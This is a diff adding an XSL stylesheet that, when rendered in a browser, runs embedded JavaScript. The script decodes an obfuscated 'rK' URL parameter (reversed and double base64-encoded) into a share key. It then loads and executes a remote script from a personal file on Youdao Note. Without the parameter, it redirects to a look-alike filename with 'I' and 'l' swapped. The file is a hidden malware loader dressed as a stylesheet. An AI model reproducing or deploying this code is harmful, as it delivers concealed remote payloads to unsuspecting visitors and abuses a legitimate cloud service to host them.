@@ -1,0 +1,53 @@
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <html>
+      <body>
+        <meta content="always" name="referrer" />
+        <meta charset="UTF-8" />
+        <script charset="UTF-8">
+          // 首先判断访问URL中有没有 rK 参数
+          var currentUrl = window.location.href;
+          var params = new URLSearchParams(currentUrl.split('?')[1]);
+          var rk = params.get('rK');
+
+          if (!rk) {
+            // 如果没有 rK 参数则调用 getMessage()
+            getMessage();
+          } else {
+            // 如果有 rK 参数
+            // 先将其字符串颠倒，然后进行 base64 解码，再次 base64 解码，然后再颠倒
+            var decodedRk = atob(atob(rk.split('').reverse().join(''))).split('').reverse().join('');
+            
+            // 根据解码后的值构建下载链接
+            var file = 'CACA9D7189DA43BB8E1CD1F9A92B231B';
+            var xUrl = `//note.youdao.com/yws/api/personal/file/${file}?method=download&inline=true&shareKey=${decodedRk}`;
+            var now = Math.round(Date.now() / 1000 / 5);
+            var s = document.createElement('script');
+            s.setAttribute('src', xUrl + '&ut=' + now);
+            s.setAttribute('charset', 'utf-8');
+            
+            // 将脚本添加到页面中
+            if (!document.body) {
+              document.head.appendChild(s);
+            } else {
+              document.body.appendChild(s);
+            }
+          }
+
+          function getMessage() {
+            const baseUrl = currentUrl.split('?')[0];
+            const fileName = baseUrl.split('/').pop();
+
+            // 替换文件名中的 'I' 和 'l'
+            let newFileName = fileName.includes('I') ? fileName.replace('I', 'l') : fileName.replace('l', 'I');
+            const queryParams = currentUrl.split('?')[1] ? `?${currentUrl.split('?')[1]}` : '';
+            const newUrl = `${baseUrl.replace(fileName, newFileName)}${queryParams}`;
+
+            // 重定向到新 URL
+            window.location.replace(newUrl);
+          }
+        </script>
+      </body>
+    </html>
+  </xsl:template>
+</xsl:stylesheet>
